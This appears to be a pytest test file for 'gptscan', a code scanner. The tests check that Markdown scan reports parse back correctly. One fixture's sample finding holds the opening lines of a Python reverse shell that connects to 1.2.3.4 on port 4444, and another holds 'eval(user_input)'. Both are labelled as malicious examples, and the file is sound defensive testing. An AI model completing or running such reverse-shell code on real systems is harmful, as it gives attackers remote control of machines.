import pytest
import os
import tempfile
import gptscan

def test_parse_markdown_content_roundtrip():
    """Test generating markdown and parsing it back returns matching findings."""
    original_results = [
        {
            "path": "src/danger.py",
            "line": "42",
            "own_conf": "85%",
            "gpt_conf": "95%",
            "admin_desc": "Executes reverse shell script.\nConnects to remote C2 server.",
            "end-user_desc": "High risk malicious code.",
            "snippet": "import socket, subprocess, os\ns = socket.socket()\ns.connect(('1.2.3.4', 4444))"
        },
        {
            "path": "scripts/clean.js",
            "line": "10",
            "own_conf": "10%",
            "gpt_conf": "",
            "admin_desc": "Standard console logger.",
            "end-user_desc": "Safe script.",
            "snippet": "console.log('Hello world');"
        }
    ]

    md_content = gptscan.generate_markdown(original_results)
    parsed_results = gptscan.parse_markdown_content(md_content)

    assert len(parsed_results) == 2

    # Verify first finding
    assert parsed_results[0]["path"] == "src/danger.py"
    assert parsed_results[0]["line"] == "42"
    assert parsed_results[0]["own_conf"] == "85%"
    assert parsed_results[0]["gpt_conf"] == "95%"
    assert "reverse shell" in parsed_results[0]["admin_desc"]
    assert "High risk" in parsed_results[0]["end-user_desc"]
    assert "socket.socket()" in parsed_results[0]["snippet"]

    # Verify second finding
    assert parsed_results[1]["path"] == "scripts/clean.js"
    assert parsed_results[1]["line"] == "10"
    assert parsed_results[1]["own_conf"] == "10%"
    assert parsed_results[1]["snippet"] == "console.log('Hello world');"


def test_parse_markdown_content_summary_table_fallback():
    """Test parsing Markdown content that contains only a summary table."""
    md_table = """# GPT Scan Results

| Path | Line | Threat Level | Analysis | Snippet |
| :--- | :--- | :--- | :--- | :--- |
| test/file.py | 15 | 90% | **Admin:** Malicious code detected<br>**User:** Do not run | <code>eval(user_input)</code> |
"""
    results = gptscan.parse_markdown_content(md_table)
    assert len(results) == 1
    assert results[0]["path"] == "test/file.py"
    assert results[0]["line"] == "15"
    assert results[0]["gpt_conf"] == "90%"
    assert results[0]["admin_desc"] == "Malicious code detected"
    assert results[0]["end-user_desc"] == "Do not run"
    assert results[0]["snippet"] == "eval(user_input)"


def test_parse_markdown_content_empty_or_whitespace():
    """Test parsing empty or whitespace-only markdown string returns empty list."""
    assert gptscan.parse_markdown_content("") == []
    assert gptscan.parse_markdown_content("   \n\n  ") == []


def test_parse_report_content_and_load_report_file_markdown(tmp_path):
    """Test parse_report_content and load_report_file with .md file hint."""
    sample = [
        {
            "path": "app.py",
            "line": "1",
            "own_conf": "90%",
            "gpt_conf": "90%",
            "admin_desc": "Suspicious import",
            "end-user_desc": "Caution",
            "snippet": "import os"
        }
    ]
    md_text = gptscan.generate_markdown(sample)

    # Test parse_report_content
    parsed = gptscan.parse_report_content(md_text, filename_hint="report.md")
    assert len(parsed) == 1
    assert parsed[0]["path"] == "app.py"

    # Test load_report_file
    file_p = tmp_path / "scan_report.markdown"
    file_p.write_text(md_text, encoding="utf-8")

    loaded = gptscan.load_report_file(str(file_p))
    assert len(loaded) == 1
    assert loaded[0]["path"] == "app.py"
